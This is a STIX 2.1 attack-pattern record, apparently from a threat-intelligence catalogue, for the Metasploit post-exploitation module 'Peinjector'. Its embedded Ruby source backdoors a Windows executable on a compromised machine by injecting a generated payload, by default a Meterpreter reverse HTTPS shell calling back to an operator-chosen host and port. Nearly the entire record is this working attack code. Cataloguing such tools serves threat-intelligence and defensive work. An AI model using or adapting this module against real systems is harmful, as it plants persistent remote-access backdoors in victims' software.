{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bf280e11-d91b-48e0-89f2-981675e73295",
    "created": "2024-08-14T16:33:04.987723Z",
    "modified": "2024-08-14T16:33:04.987726Z",
    "name": "Peinjector",
    "description": " This module will inject a specified windows payload into a target executable.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/peinjector.rb",
            "external_id": "peinjector.rb"
        }
    ],
    "x_code_snippet": "require 'rex'\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::Common\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Peinjector',\n        'Description' => %q{\n          This module will inject a specified windows payload into a target executable.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Maximiliano Tedesco <maxitedesco1@gmail.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              peinjector_inject_shellcode\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('PAYLOAD', [false, 'Windows Payload to inject into the targer executable.', 'windows/meterpreter/reverse_https']),\n        OptAddress.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),\n        OptInt.new('LPORT', [false, 'Port for Payload to connect to.', 4433]),\n        OptString.new('TARGETPE', [false, 'Path of the target executable to be injected']),\n        OptString.new('OPTIONS', [false, \"Comma separated list of additional options for payload if needed in \\'opt=val,opt=val\\' format.\"])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    session.core.use('peinjector')\n\n    # syinfo is only on meterpreter sessions\n    print_status(\"Running module against #{sysinfo['Computer']}\") if !sysinfo.nil?\n\n    # Check that the payload is a Windows one and on the list\n    if !session.framework.payloads.keys.grep(/windows/).include?(datastore['PAYLOAD'])\n      print_error(\"The Payload specified #{datastore['PAYLOAD']} is not a valid for this system\")\n      return\n    end\n\n    # Set variables\n    pay_name = datastore['PAYLOAD']\n    lhost = datastore['LHOST']\n    lport = datastore['LPORT']\n    targetpe = datastore['TARGETPE']\n    opts = datastore['OPTIONS']\n\n    # Create payload\n    payload = create_payload(pay_name, lhost, lport, opts)\n\n    # Inject payload\n    inject_payload(payload, targetpe)\n  end\n\n  # Create a payload given a name, lhost and lport, additional options\n  def create_payload(name, lhost, lport, opts = '')\n    pay = client.framework.payloads.create(name)\n    pay.datastore['LHOST'] = lhost\n    pay.datastore['LPORT'] = lport\n    pay.datastore['EXITFUNC'] = 'thread'\n    pay.available_space = 1.gigabyte # this is to generate a proper uuid and make the payload to work with the universal handler\n\n    if !opts.blank?\n      opts.split(',').each do |o|\n        opt, val = o.split('=', 2)\n        pay.datastore[opt] = val\n      end\n    end\n    # Validate the options for the module\n    pay.options.validate(pay.datastore)\n    return pay\n  end\n\n  def inject_payload(pay, targetpe)\n    print_status('Generating payload')\n    raw = pay.generate\n    param = {}\n\n    if pay.arch.join == ARCH_X64\n      threaded_shellcode = client.peinjector.add_thread_x64(raw)\n      param[:isx64] = true\n    else\n      threaded_shellcode = client.peinjector.add_thread_x86(raw)\n      param[:isx64] = false\n    end\n\n    param[:shellcode] = threaded_shellcode\n    param[:targetpe] = targetpe\n    param[:size] = threaded_shellcode.length\n\n    print_status(\"Injecting #{pay.name} into the executable #{param[:targetpe]}\")\n    client.peinjector.inject_shellcode(param)\n    print_good(\"Successfully injected payload into the executable: #{param[:targetpe]}\")\n  rescue ::Exception => e\n    print_error(\"Failed to Inject Payload to executable #{param[:targetpe]}!\")\n    print_error(e.to_s)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}